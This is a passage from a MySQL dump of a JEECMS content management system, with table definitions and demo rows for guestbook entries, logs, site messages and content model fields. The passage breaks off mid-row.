-- Table structure for table `jc_guestbook`
--

DROP TABLE IF EXISTS `jc_guestbook`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_guestbook` (
  `guestbook_id` int(11) NOT NULL AUTO_INCREMENT,
  `site_id` int(11) NOT NULL,
  `guestbookctg_id` int(11) NOT NULL,
  `member_id` int(11) DEFAULT NULL COMMENT '留言会员',
  `admin_id` int(11) DEFAULT NULL COMMENT '回复管理员',
  `ip` varchar(50) NOT NULL COMMENT '留言IP',
  `create_time` datetime NOT NULL COMMENT '留言时间',
  `replay_time` datetime DEFAULT NULL COMMENT '回复时间',
  `is_checked` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否审核',
  `is_recommend` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否推荐',
  PRIMARY KEY (`guestbook_id`),
  KEY `fk_jc_ctg_guestbook` (`guestbookctg_id`),
  KEY `fk_jc_guestbook_admin` (`admin_id`),
  KEY `fk_jc_guestbook_member` (`member_id`),
  KEY `fk_jc_guestbook_site` (`site_id`),
  CONSTRAINT `fk_jc_ctg_guestbook` FOREIGN KEY (`guestbookctg_id`) REFERENCES `jc_guestbook_ctg` (`guestbookctg_id`),
  CONSTRAINT `fk_jc_guestbook_admin` FOREIGN KEY (`admin_id`) REFERENCES `jc_user` (`user_id`),
  CONSTRAINT `fk_jc_guestbook_member` FOREIGN KEY (`member_id`) REFERENCES `jc_user` (`user_id`),
  CONSTRAINT `fk_jc_guestbook_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`)
) ENGINE=InnoDB AUTO_INCREMENT=7 DEFAULT CHARSET=utf8 COMMENT='CMS留言';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_guestbook`
--

LOCK TABLES `jc_guestbook` WRITE;
/*!40000 ALTER TABLE `jc_guestbook` DISABLE KEYS */;
INSERT INTO `jc_guestbook` VALUES (3,1,1,NULL,1,'117.41.152.66','2016-10-10 15:02:04',NULL,1,1),(4,1,1,NULL,1,'117.41.152.66','2016-10-10 15:07:53',NULL,1,1),(5,1,1,NULL,1,'117.41.152.66','2016-10-10 15:08:41',NULL,1,1),(6,1,1,NULL,1,'117.41.152.66','2016-10-10 15:09:06',NULL,1,1);
/*!40000 ALTER TABLE `jc_guestbook` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_guestbook_ctg`
--

DROP TABLE IF EXISTS `jc_guestbook_ctg`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_guestbook_ctg` (
  `guestbookctg_id` int(11) NOT NULL AUTO_INCREMENT,
  `site_id` int(11) NOT NULL,
  `ctg_name` varchar(100) NOT NULL COMMENT '名称',
  `priority` int(11) NOT NULL DEFAULT '10' COMMENT '排列顺序',
  `description` varchar(255) DEFAULT NULL COMMENT '描述',
  PRIMARY KEY (`guestbookctg_id`),
  KEY `fk_jc_guestbookctg_site` (`site_id`),
  CONSTRAINT `fk_jc_guestbookctg_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8 COMMENT='CMS留言类别';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_guestbook_ctg`
--

LOCK TABLES `jc_guestbook_ctg` WRITE;
/*!40000 ALTER TABLE `jc_guestbook_ctg` DISABLE KEYS */;
INSERT INTO `jc_guestbook_ctg` VALUES (1,1,'普通',1,'普通留言'),(2,1,'投诉',10,'投诉');
/*!40000 ALTER TABLE `jc_guestbook_ctg` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_guestbook_ext`
--

DROP TABLE IF EXISTS `jc_guestbook_ext`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_guestbook_ext` (
  `guestbook_id` int(11) NOT NULL,
  `title` varchar(255) DEFAULT NULL COMMENT '留言标题',
  `content` longtext COMMENT '留言内容',
  `reply` longtext COMMENT '回复内容',
  `email` varchar(100) DEFAULT NULL COMMENT '电子邮件',
  `phone` varchar(100) DEFAULT NULL COMMENT '电话',
  `qq` varchar(50) DEFAULT NULL COMMENT 'QQ',
  KEY `fk_jc_ext_guestbook` (`guestbook_id`),
  CONSTRAINT `fk_jc_ext_guestbook` FOREIGN KEY (`guestbook_id`) REFERENCES `jc_guestbook` (`guestbook_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS留言内容';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_guestbook_ext`
--

LOCK TABLES `jc_guestbook_ext` WRITE;
/*!40000 ALTER TABLE `jc_guestbook_ext` DISABLE KEYS */;
INSERT INTO `jc_guestbook_ext` VALUES (3,'新版jeecms v8的改动很大，希望做得更好，持续关注中。','新版jeecms v8的改动很大，希望做得更好，持续关注中。',NULL,NULL,NULL,NULL),(4,'怎么在页面首页放一个视频之后我点击的时候就可以看？','怎么在页面首页放一个视频之后我点击的时候就可以看？',NULL,NULL,NULL,NULL),(5,'网店和论坛的用户管理和jeecms 可以统一起来吗？	','网店和论坛的用户管理和jeecms 可以统一起来吗？	',NULL,NULL,NULL,NULL),(6,'请问在内容中上传视频的限制是多大，能不能自己设置设置视频的大小	','请问在内容中上传视频的限制是多大，能不能自己设置设置视频的大小	',NULL,NULL,NULL,NULL);
/*!40000 ALTER TABLE `jc_guestbook_ext` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_job_apply`
--

DROP TABLE IF EXISTS `jc_job_apply`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_job_apply` (
  `job_apply_id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) NOT NULL COMMENT '用户id',
  `content_id` int(11) NOT NULL COMMENT '职位id',
  `apply_time` datetime NOT NULL COMMENT '申请时间',
  PRIMARY KEY (`job_apply_id`),
  KEY `fk_jc_job_apply_user` (`user_id`),
  KEY `fk_jc_job_apply_content` (`content_id`),
  CONSTRAINT `fk_jc_job_apply_content` FOREIGN KEY (`content_id`) REFERENCES `jc_content` (`content_id`),
  CONSTRAINT `fk_jc_job_apply_user` FOREIGN KEY (`user_id`) REFERENCES `jc_user` (`user_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='职位申请表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_job_apply`
--

LOCK TABLES `jc_job_apply` WRITE;
/*!40000 ALTER TABLE `jc_job_apply` DISABLE KEYS */;
/*!40000 ALTER TABLE `jc_job_apply` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_keyword`
--

DROP TABLE IF EXISTS `jc_keyword`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_keyword` (
  `keyword_id` int(11) NOT NULL AUTO_INCREMENT,
  `site_id` int(11) DEFAULT NULL COMMENT '站点ID',
  `keyword_name` varchar(100) NOT NULL COMMENT '名称',
  `url` varchar(255) NOT NULL COMMENT '链接',
  `is_disabled` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否禁用',
  PRIMARY KEY (`keyword_id`),
  KEY `fk_jc_keyword_site` (`site_id`),
  CONSTRAINT `fk_jc_keyword_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COMMENT='CMS内容关键词表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_keyword`
--

LOCK TABLES `jc_keyword` WRITE;
/*!40000 ALTER TABLE `jc_keyword` DISABLE KEYS */;
INSERT INTO `jc_keyword` VALUES (1,NULL,'内容管理系统','<a href=\"http://www.jeecms.com/\" target=\"_blank\">内容管理系统</a>',0);
/*!40000 ALTER TABLE `jc_keyword` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_log`
--

DROP TABLE IF EXISTS `jc_log`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_log` (
  `log_id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) DEFAULT NULL,
  `site_id` int(11) DEFAULT NULL,
  `category` int(11) NOT NULL COMMENT '日志类型',
  `log_time` datetime NOT NULL COMMENT '日志时间',
  `ip` varchar(50) DEFAULT NULL COMMENT 'IP地址',
  `url` varchar(255) DEFAULT NULL COMMENT 'URL地址',
  `title` varchar(255) DEFAULT NULL COMMENT '日志标题',
  `content` varchar(255) DEFAULT NULL COMMENT '日志内容',
  PRIMARY KEY (`log_id`),
  KEY `fk_jc_log_site` (`site_id`),
  KEY `fk_jc_log_user` (`user_id`),
  CONSTRAINT `fk_jc_log_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`),
  CONSTRAINT `fk_jc_log_user` FOREIGN KEY (`user_id`) REFERENCES `jc_user` (`user_id`)
) ENGINE=InnoDB AUTO_INCREMENT=23 DEFAULT CHARSET=utf8 COMMENT='CMS日志表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_log`
--

LOCK TABLES `jc_log` WRITE;
/*!40000 ALTER TABLE `jc_log` DISABLE KEYS */;
INSERT INTO `jc_log` VALUES (16,1,NULL,1,'2016-12-20 14:08:43','127.0.0.1','/jeecms/jeeadmin/jeecms/login.do','login success',NULL),(17,1,NULL,1,'2017-01-17 14:00:04','127.0.0.1','/jeecms/jeeadmin/jeecms/login.do','login success',NULL),(18,1,NULL,1,'2017-01-17 15:59:15','127.0.0.1','/jeecms/jeeadmin/jeecms/login.do','login success',NULL),(19,1,NULL,1,'2017-01-17 16:00:18','127.0.0.1','/jeecms/jeeadmin/jeecms/login.do','login success',NULL),(20,1,NULL,1,'2017-01-23 11:21:18','127.0.0.1','/jeecms/jeeadmin/jeecms/login.do','login success',NULL),(21,1,NULL,1,'2017-02-09 20:44:34','127.0.0.1','/jeecms/jeeadmin/jeecms/login.do','login success',NULL),(22,1,NULL,1,'2017-02-20 09:34:20','127.0.0.1','/jeecms/jeeadmin/jeecms/login.do','login success',NULL);
/*!40000 ALTER TABLE `jc_log` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_message`
--

DROP TABLE IF EXISTS `jc_message`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_message` (
  `msg_id` int(11) NOT NULL AUTO_INCREMENT COMMENT '消息id',
  `msg_title` varchar(255) NOT NULL DEFAULT '' COMMENT '标题',
  `msg_content` longtext COMMENT '站内信息内容',
  `send_time` timestamp NULL DEFAULT NULL COMMENT '发送时间',
  `msg_send_user` int(11) NOT NULL DEFAULT '1' COMMENT '发信息人',
  `msg_receiver_user` int(11) NOT NULL DEFAULT '0' COMMENT '接收人',
  `site_id` int(11) NOT NULL DEFAULT '1' COMMENT '站点',
  `msg_status` tinyint(1) NOT NULL DEFAULT '0' COMMENT '消息状态0未读，1已读',
  `msg_box` int(2) NOT NULL DEFAULT '1' COMMENT '消息信箱 0收件箱 1发件箱 2草稿箱 3垃圾箱',
  PRIMARY KEY (`msg_id`),
  KEY `fk_jc_message_user_send` (`msg_send_user`),
  KEY `fk_jc_message_user_receiver` (`msg_receiver_user`),
  KEY `fk_jc_message_site` (`site_id`),
  CONSTRAINT `fk_jc_message_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`),
  CONSTRAINT `fk_jc_message_user_receiver` FOREIGN KEY (`msg_receiver_user`) REFERENCES `jc_user` (`user_id`),
  CONSTRAINT `fk_jc_message_user_send` FOREIGN KEY (`msg_send_user`) REFERENCES `jc_user` (`user_id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COMMENT='站内信';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_message`
--

LOCK TABLES `jc_message` WRITE;
/*!40000 ALTER TABLE `jc_message` DISABLE KEYS */;
INSERT INTO `jc_message` VALUES (1,'msg1','msgcontent1',NULL,1,1,1,0,1);
/*!40000 ALTER TABLE `jc_message` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_model`
--

DROP TABLE IF EXISTS `jc_model`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_model` (
  `model_id` int(11) NOT NULL,
  `model_name` varchar(100) NOT NULL COMMENT '名称',
  `model_path` varchar(100) NOT NULL COMMENT '路径',
  `tpl_channel_prefix` varchar(20) DEFAULT NULL COMMENT '栏目模板前缀',
  `tpl_content_prefix` varchar(20) DEFAULT NULL COMMENT '内容模板前缀',
  `title_img_width` int(11) NOT NULL DEFAULT '139' COMMENT '栏目标题图宽度',
  `title_img_height` int(11) NOT NULL DEFAULT '139' COMMENT '栏目标题图高度',
  `content_img_width` int(11) NOT NULL DEFAULT '310' COMMENT '栏目内容图宽度',
  `content_img_height` int(11) NOT NULL DEFAULT '310' COMMENT '栏目内容图高度',
  `priority` int(11) NOT NULL DEFAULT '10' COMMENT '排列顺序',
  `has_content` tinyint(1) NOT NULL DEFAULT '1' COMMENT '是否有内容',
  `is_disabled` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否禁用',
  `is_def` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否默认模型',
  `is_global` tinyint(1) NOT NULL DEFAULT '1' COMMENT '是否全站模型',
  `site_id` int(11) DEFAULT NULL COMMENT '非全站模型所属站点',
  PRIMARY KEY (`model_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS模型表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_model`
--

LOCK TABLES `jc_model` WRITE;
/*!40000 ALTER TABLE `jc_model` DISABLE KEYS */;
INSERT INTO `jc_model` VALUES (1,'新闻','1','news','news',139,139,310,310,1,1,0,1,1,NULL),(2,'单页','2','alone','alone',139,139,310,310,2,0,0,0,1,NULL),(4,'下载','4','download','download',139,139,310,310,4,1,0,0,1,NULL),(5,'图库','5','pic','pic',139,139,310,310,5,1,0,0,1,NULL),(6,'视频','6','video','video',139,139,310,310,10,1,0,0,1,NULL),(8,'招聘','job','job','job',139,139,310,310,10,1,0,0,1,NULL);
/*!40000 ALTER TABLE `jc_model` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_model_item`
--

DROP TABLE IF EXISTS `jc_model_item`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_model_item` (
  `modelitem_id` int(11) NOT NULL AUTO_INCREMENT,
  `model_id` int(11) NOT NULL,
  `field` varchar(50) NOT NULL COMMENT '字段',
  `item_label` varchar(100) NOT NULL COMMENT '名称',
  `priority` int(11) NOT NULL DEFAULT '70' COMMENT '排列顺序',
  `def_value` varchar(255) DEFAULT NULL COMMENT '默认值',
  `opt_value` varchar(255) DEFAULT NULL COMMENT '可选项',
  `text_size` varchar(20) DEFAULT NULL COMMENT '长度',
  `area_rows` varchar(3) DEFAULT NULL COMMENT '文本行数',
  `area_cols` varchar(3) DEFAULT NULL COMMENT '文本列数',
  `help` varchar(255) DEFAULT NULL COMMENT '帮助信息',
  `help_position` varchar(1) DEFAULT NULL COMMENT '帮助位置',
  `data_type` int(11) NOT NULL DEFAULT '1' COMMENT '数据类型',
  `is_single` tinyint(1) NOT NULL DEFAULT '1' COMMENT '是否独占一行',
  `is_channel` tinyint(1) NOT NULL DEFAULT '1' COMMENT '是否栏目模型项',
  `is_custom` tinyint(1) NOT NULL DEFAULT '1' COMMENT '是否自定义',
  `is_display` tinyint(1) NOT NULL DEFAULT '1' COMMENT '是否显示',
  `is_required` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否必填项',
  `image_width` int(11) DEFAULT NULL COMMENT '图片宽度',
  `image_height` int(11) DEFAULT NULL COMMENT '图片宽度',
  PRIMARY KEY (`modelitem_id`),
  KEY `fk_jc_item_model` (`model_id`),
  CONSTRAINT `fk_jc_item_model` FOREIGN KEY (`model_id`) REFERENCES `jc_model` (`model_id`)
) ENGINE=InnoDB AUTO_INCREMENT=458 DEFAULT CHARSET=utf8 COMMENT='CMS模型项表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_model_item`
--

LOCK TABLES `jc_model_item` WRITE;
/*!40000 ALTER TABLE `jc_model_item` DISABLE KEYS */;
INSERT INTO `jc_model_item` VALUES (1,1,'name','栏目名称',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,0,1,0,1,1,NULL,NULL),(2,1,'path','访问路径',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,2,0,1,0,1,1,NULL,NULL),(3,1,'title','meta标题',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,0,1,0,1,1,NULL,NULL),(4,1,'keywords','meta关键字',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,0,1,0,1,0,NULL,NULL),(5,1,'description','meta描述',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,4,1,1,0,1,0,NULL,NULL),(6,1,'tplChannel','栏目模板',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,0,1,0,1,0,NULL,NULL),(7,1,'tplContent','选择模型模板',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,1,1,0,1,0,NULL,NULL),(8,1,'channelStatic','栏目静态化',11,NULL,NULL,NULL,NULL,NULL,NULL,NULL,4,1,1,0,1,0,NULL,NULL),(9,1,'contentStatic','内容静态化',11,NULL,NULL,NULL,NULL,NULL,NULL,NULL,4,1,1,0,1,0,NULL,NULL),(10,1,'priority','排列顺序',11,NULL,NULL,NULL,NULL,NULL,NULL,NULL,2,0,1,0,1,0,NULL,NULL),(11,1,'display','显示',11,NULL,NULL,NULL,NULL,NULL,NULL,NULL,8,0,1,0,1,0,NULL,NULL),(12,1,'docImg','文档图片',11,NULL,NULL,NULL,NULL,NULL,NULL,NULL,8,1,1,0,1,0,NULL,NULL),(14,1,'afterCheck','审核后',12,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,0,1,0,1,0,NULL,NULL),(15,1,'commentControl','评论',11,NULL,NULL,NULL,NULL,NULL,NULL,NULL,8,0,1,0,1,0,NULL,NULL),(16,1,'allowUpdown','顶踩',11,NULL,NULL,NULL,NULL,NULL,NULL,NULL,8,0,1,0,1,0,NULL,NULL),(17,1,'viewGroupIds','浏览权限',11,NULL,NULL,NULL,NULL,NULL,NULL,NULL,7,0,1,0,1,0,NULL,NULL),(18,1,'contriGroupIds','投稿权限',11,NULL,NULL,NULL,NULL,NULL,NULL,NULL,7,0,1,0,1,0,NULL,NULL),(20,1,'link','外部链接',11,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,1,0,1,0,NULL,NULL),(21,1,'titleImg','标题图',11,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,1,0,1,0,NULL,NULL),(23,1,'title','标题',9,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,0,0,1,1,NULL,NULL),(24,1,'shortTitle','简短标题',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,0,0,0,1,0,NULL,NULL),(25,1,'titleColor','标题颜色',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,0,0,0,1,0,NULL,NULL),(26,1,'tagStr','Tag标签',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,0,0,1,0,NULL,NULL),(27,1,'description','摘要',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,4,1,0,0,1,0,NULL,NULL),(28,1,'author','作者',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,0,0,0,1,0,NULL,NULL),(29,1,'origin','来源',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,0,0,0,1,0,NULL,NULL),(30,1,'viewGroupIds','浏览权限',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,7,1,0,0,1,0,NULL,NULL),(31,1,'topLevel','固顶级别',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,0,0,0,1,0,NULL,NULL),(32,1,'releaseDate','发布时间',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,5,0,0,0,1,0,NULL,NULL),(33,1,'typeId','内容类型',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,0,0,0,1,0,NULL,NULL),(34,1,'tplContent','指定模板',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,0,0,0,1,0,NULL,NULL),(35,1,'typeImg','类型图',11,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,0,0,1,0,NULL,NULL),(36,1,'titleImg','标题图',11,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,0,0,1,0,NULL,NULL),(37,1,'contentImg','内容图',11,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,0,0,1,0,NULL,NULL),(38,1,'attachments','附件',11,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,0,0,1,0,NULL,NULL),(39,1,'media','多媒体',11,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,0,0,1,0,NULL,NULL),(40,1,'txt','内容',11,NULL,NULL,NULL,NULL,NULL,NULL,NULL,4,1,0,0,1,0,NULL,NULL),(42,2,'name','栏目名称',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,0,1,0,1,1,NULL,NULL),(43,2,'path','访问路径',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,2,0,1,0,1,1,NULL,NULL),(44,2,'title','meta标题',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,0,1,0,1,1,NULL,NULL),(45,2,'keywords','meta关键字',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,0,1,0,1,0,NULL,NULL),(46,2,'description','meta描述',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,4,1,1,0,1,0,NULL,NULL),(47,2,'tplChannel','栏目模板',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,0,1,0,1,0,NULL,NULL),(48,2,'priority','排列顺序',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,2,0,1,0,1,0,NULL,NULL),(49,2,'display','显示',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,8,0,1,0,1,0,NULL,NULL),(51,2,'link','外部链接',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,1,0,1,0,NULL,NULL),(52,2,'contentImg','内容图',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,1,0,1,0,NULL,NULL),(53,2,'txt','内容',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,4,1,1,0,1,0,NULL,NULL),(93,4,'name','栏目名称',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,0,1,0,1,1,NULL,NULL),(94,4,'path','访问路径',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,2,0,1,0,1,1,NULL,NULL),(95,4,'title','meta标题',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,0,1,0,1,1,NULL,NULL),(96,4,'keywords','meta关键字',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,0,1,0,1,0,NULL,NULL),(97,4,'description','meta描述',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,4,1,1,0,1,0,NULL,NULL),(98,4,'tplChannel','栏目模板',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,0,1,0,1,0,NULL,NULL),(99,4,'tplContent','选择模型模板',9,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,1,1,0,1,0,NULL,NULL),(100,4,'priority','排列顺序',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,2,0,1,0,1,0,NULL,NULL),(101,4,'display','显示',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,8,0,1,0,1,0,NULL,NULL),(102,4,'docImg','文档图片',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,8,1,1,0,1,0,NULL,NULL),(103,4,'commentControl','评论',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,8,0,1,0,1,0,NULL,NULL),(104,4,'allowUpdown','顶踩',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,8,0,1,0,1,0,NULL,NULL),(105,4,'viewGroupIds','浏览权限',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,7,1,1,0,1,0,NULL,NULL),(107,4,'channelId','栏目',1,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,1,0,0,1,1,NULL,NULL),(108,4,'title','软件名称',2,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,0,0,1,1,NULL,NULL),(109,4,'shortTitle','软件简称',3,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,0,0,0,1,0,NULL,NULL),(110,4,'titleColor','标题颜色',4,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,0,0,0,1,0,NULL,NULL),(111,4,'description','摘要',5,NULL,NULL,NULL,NULL,NULL,NULL,NULL,4,1,0,0,1,0,NULL,NULL),(112,4,'author','发布人',6,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,0,0,0,1,0,NULL,NULL),(113,4,'viewGroupIds','浏览权限',7,NULL,NULL,NULL,NULL,NULL,NULL,NULL,7,0,0,0,1,0,NULL,NULL),(114,4,'topLevel','固顶级别',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,0,0,0,1,0,NULL,NULL),(115,4,'releaseDate','发布时间',9,NULL,NULL,NULL,NULL,NULL,NULL,NULL,5,0,0,0,1,0,NULL,NULL),(116,4,'typeId','内容类型',9,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,0,0,0,1,0,NULL,NULL),(117,4,'tplContent','指定模板',22,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,1,0,0,1,0,NULL,NULL),(118,4,'contentImg','内容图',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,0,0,1,0,NULL,NULL),(119,4,'attachments','资源上传',11,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,0,0,1,0,NULL,NULL),(120,4,'txt','软件介绍',20,NULL,NULL,NULL,NULL,NULL,NULL,NULL,4,1,0,0,1,0,NULL,NULL),(121,4,'softType','软件类型',12,'国产软件','国产软件,国外软件','100','3','30',NULL,NULL,6,0,0,1,1,0,NULL,NULL),(122,4,'warrant','软件授权',13,'免费版','免费版,共享版','','3','30','','',6,0,0,1,1,0,NULL,NULL),(123,4,'relatedLink','相关链接',14,'http://','','50','3','30','','',1,0,0,1,1,0,NULL,NULL),(124,4,'demoUrl','演示地址',15,'http://',NULL,'60','3','30',NULL,NULL,1,0,0,1,1,0,NULL,NULL),(125,5,'name','栏目名称',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,0,1,0,1,1,NULL,NULL),(126,5,'path','访问路径',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,2,0,1,0,1,1,NULL,NULL),(127,5,'title','meta标题',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,0,1,0,1,1,NULL,NULL),(128,5,'keywords','meta关键字',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,0,1,0,1,0,NULL,NULL),(129,5,'description','meta描述',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,4,1,1,0,1,0,NULL,NULL),(130,5,'tplChannel','栏目模板',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,0,1,0,1,0,NULL,NULL),(131,5,'tplContent','选择模型模板',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,1,1,0,1,0,NULL,NULL),(132,5,'channelStatic','栏目静态化',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,4,1,1,0,1,0,NULL,NULL),(133,5,'contentStatic','内容静态化',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,4,1,1,0,1,0,NULL,NULL),(134,5,'priority','排列顺序',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,2,0,1,0,1,0,NULL,NULL),(135,5,'display','显示',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,8,0,1,0,1,0,NULL,NULL),(136,5,'docImg','文档图片',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,8,1,1,0,1,0,NULL,NULL),(138,5,'afterCheck','审核后',11,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,0,1,0,1,0,NULL,NULL),(139,5,'commentControl','评论',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,8,0,1,0,1,0,NULL,NULL),(140,5,'allowUpdown','顶踩',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,8,0,1,0,1,0,NULL,NULL),(141,5,'viewGroupIds','浏览权限',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,7,0,1,0,1,0,NULL,NULL),(142,5,'contriGroupIds','投稿权限',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,7,0,1,0,1,0,NULL,NULL),(144,5,'link','外部链接',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,1,0,1,0,NULL,NULL),(145,5,'titleImg','标题图',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,1,0,1,0,NULL,NULL),(146,5,'contentImg','内容图',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,1,0,1,0,NULL,NULL),(147,5,'channelId','栏目',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,1,0,0,1,1,NULL,NULL),(148,5,'title','标题',10,NULL,NULL,NULL,NUL